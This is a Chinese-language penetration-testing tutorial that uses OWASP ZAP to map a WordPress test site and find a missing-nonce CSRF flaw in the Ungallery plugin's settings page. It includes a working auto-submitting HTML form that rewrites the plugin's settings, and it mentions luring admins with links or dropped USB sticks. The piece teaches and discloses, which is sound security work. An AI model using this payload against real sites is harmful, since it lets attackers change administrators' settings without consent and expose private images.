
## 发现漏洞

如何识别并利用你网站中的弱点。

如果你看过 LXF Vulnerable WordPress VM（一个易受攻击的 WordPress 虚拟机），你很可能已经得出结论：一旦知道了漏洞在哪里，利用它们很容易，但你会想知道如何着手发现它们。为了回答这个问题，我们给自己设定了一个挑战：发现并利用我们站点中的一个新漏洞。

首先，我们安装了一个攻击代理。这种工具会拦截来自你浏览器的 HTTP 请求，并用它们构建出你所浏览站点的地图。使用这个工具，即使你无法访问源代码，也能了解你正在攻击的是什么。它还能让你了解服务器和浏览器之间来回传递了哪些信息。

我们选择了 OWASP 的 ZAP（可从 http://code.google.com/p/zaproxy 获取，并随 HackWeb 文件夹提供）。要使用它，只需解压并运行（无需安装），命令如下：

tar zxvf ZAP_2.0.0_Linux.tar.gz
cd ZAP_2.0.0
./zap.sh

2.0.0 版本需要 Java 1.7 或更高版本。如果你的版本较旧（比如较旧的 Ubuntu 12.04 LTS 默认版本），你可以使用 ZAP 1.4.1 版本，或者手动安装较新的 Java 版本。在我们的 Precise Pangolin 机器上，我们安装了 openjdk-7-jre 软件包，然后将 zap.sh 的最后一行改为：

exec /usr/lib/jvm/java-7-openjdk-1.6/bin/java $JMEM -XX:PermSize=256M -jar $BASEDIR/zap.jar org.zaproxy.zap.ZAPStart

这会让代理运行在 8080 端口，所以你需要将浏览器设置为通过这个端口传输数据。
在 Firefox 中，通过“编辑 > 偏好设置”，然后“高级 > 网络 > 设置”，将单选按钮改为“手动代理配置”，HTTP 代理设为 localhost，端口设为 8080。

> “任何渗透测试的第一阶段都是收集信息”

现在，每当你访问一个页面，你应该会在 ZAP 中看到一个或多个条目。ZAP 还会尝试帮助你，将它认为有漏洞的项目标记为黄色到红色，具体颜色取决于它认为问题有多严重。蓝色标记仅用于提供信息。不过，这些评级不能全信。许多被标记的页面实际上并不存在漏洞，而许多真正有漏洞的页面却被漏掉了（这是我们用过的所有自动化安全扫描器都存在的问题）。

软件设置好之后，我们就可以开始攻击了。任何渗透测试的第一阶段都是信息收集。ZAP 确实有一些用于自动扫描站点的工具，但我们更倾向于从手动扫描开始。这意味着在浏览器中浏览站点，同时让 ZAP 在你浏览时进行编目。你浏览站点时越彻底，获得的信息就越多。

当我们浏览应用程序时，我们是在寻找攻击向量。从根本上说，攻击向量是向网站传递信息的任何方式。在 HTTP 中，它们有两种形式：GET 请求中传递的参数（即 URL 中问号后面的部分），以及 POST 请求（没有像 ZAP 这样的代理时很难看到这些请求，但它们列在“请求”选项卡中）。其中任何一个都可以被修改，以发送我们想要的任何信息。正如你在示例中看到的（针对 WordPress 博客的攻击，如果站点没有正确验证这些输入，精心构造的恶意数据有时就能被偷偷传入）。

![](img/b6e789f7b1bc6629f6c97a3e4beae1de_67_0.png)

这里，我们发现了一个缺失的 nonce 字段，它使我们能够利用该表单。

一旦我们对受害站点有了完整的了解，就可以开始寻找攻击点。即使是在像我们这样简单的 WordPress 站点上，也有数百个可供研究的向量，但大多数不会存在漏洞。入侵网站的艺术之一在于知道应该重点关注哪些向量。例如，我们可以尝试攻击大多数页面上都有的 page_id 参数，但该参数对 WordPress 来说如此核心，以至于它一直受到大量关注。它可能存在漏洞，但很可能是一条难走的入侵之路。我们最好在较少使用的区域中寻找弱点。从历史上看，插件（add-ons）对攻击者来说远比主应用程序更有价值。

## 跨站请求伪造

我们注意到，在“警报”选项卡下，ZAP 将许多页面列为存在跨站请求伪造（CSRF）漏洞。这是一种通过创建另一个伪装成 Web 应用 HTTP 请求的网站，从而诱骗 Web 应用接受输入的攻击方式。如果你随后能让一个已通过身份验证的用户打开你的恶意网站，他们的浏览器就会发送他们的身份验证 cookie，从而允许你的恶意 HTTP 请求以他们的用户身份被执行（如果你没有完全理解，别担心，在我们进行攻击时会变得更加清晰）。

WordPress 通常使用 nonce（一次性随机数）来阻止这种攻击。这是在创建表单时传递给浏览器的一个随机数。如果相同的数字随表单数据一起传回服务器，那么服务器就知道该表单是由本网站的用户提交的。如果不是，服务器就会知道该表单是由其他网站提交的，并直接丢弃数据。然而，我们注意到其中一个页面没有 nonce。它似乎是一个直接使用 cookie 验证的 HTTP POST 请求。这意味着任何 HTML 表单（无论位于哪个网站）都可以向应用程序的这一部分提交数据。这看起来是发起 CSRF 攻击的完美目标。这个页面正是 Ungallery 的设置页面（关于该请求，请参见左下角的截图）。

现在的技巧是创建一个生成相同 HTTP 请求的新页面。这是一个 POST 请求，而使用 HTML 表单最容易伪造。我们创建了一个包含以下内容的新文件：

```
<html>
<head>
<title>Test site for csrf in Ungallery</title>
</head>
<body>
<form action="http://site/wp-admin/options-general.php?page=ungallery-settings" method="POST">
<input type="hidden" name="_nt_submit_hidden" value="Y">
<input type="hidden" name="images_path" value="%2Froot%2Fvar%2Fwww%2Fimages%2F">
<input type="hidden" name="URI" value="http%3A%2F%2F192.168.133.143%2F">
<input type="hidden" name="gallery" value="%3Fpage_id%3D9">
<input type="hidden" name="cache_dir" value="%2Fvar%2Fwww%2Fwordpress%2Fwp-content%2Fcache%2F">
<input type="hidden" name="columns" value="5">
```

![](img/b6e789f7b1bc6629f6c97a3e4beae1de_68_0.png)

“快速开始”选项卡是 ZAP 2 中新增的。只需输入你想攻击的 URL，它就会爬取网站并搜索漏洞。这是一个很好的起点，但它不会发现所有内容。

```
<input type="hidden" name="thumbnail" value="190">
<input type="hidden" name="browse_view" value="440">
<input type="hidden" name="hidden" value="hidden">
<input type="hidden" name="gallery2" value="">
<input type="hidden" name="images2_path" value="">
<input type="hidden" name="gallery3" value="">
<input type="hidden" name="images3_path" value="">
<input type="hidden" name="gallery4" value="">
<input type="hidden" name="images4_path" value="">
<input type="hidden" name="gallery5" value="">
<input type="hidden" name="images5_path" value="">
<input type="hidden" name="gallery6" value="">
<input type="hidden" name="images6_path" value="">
<input type="hidden" name="Submit" value="">
value="Save Changes">
<form>
<script>document.forms[0].submit();</script>
</head>
```

如你所见，这是一个新的 HTML 表单，它向 Ungallery 设置页面提交数据。由于没有 nonce，Ungallery 在收到正确 cookie 后会自动接受。如果有管理员权限的人打开该文件，它就会更改设置。在真实攻击中，可以通过向管理员发送一个诱人的链接，或者将带有自动运行脚本的 U 盘遗落在公共场所来实现。当然，这并不是最具破坏性的攻击，但它可以用来泄露本应保密的图像。

当然，故事并没有就此结束。我们实践负责任的信息披露。这意味着，虽然我们乐于公开漏洞的细节，但我们确保首先告知了开发人员。

如你所见，发现漏洞就是把知道该寻找什么和在应用程序中搜索结合起来。这可能是一个漫长而缓慢的过程。有一些自动化扫描器（例如 ZAP 内置的扫描器），但一开始最好手动进行，这样你才能知道发生了什么。许多渗透测试人员更喜欢手动操作，因为手动能比自动扫描器彻底得多。
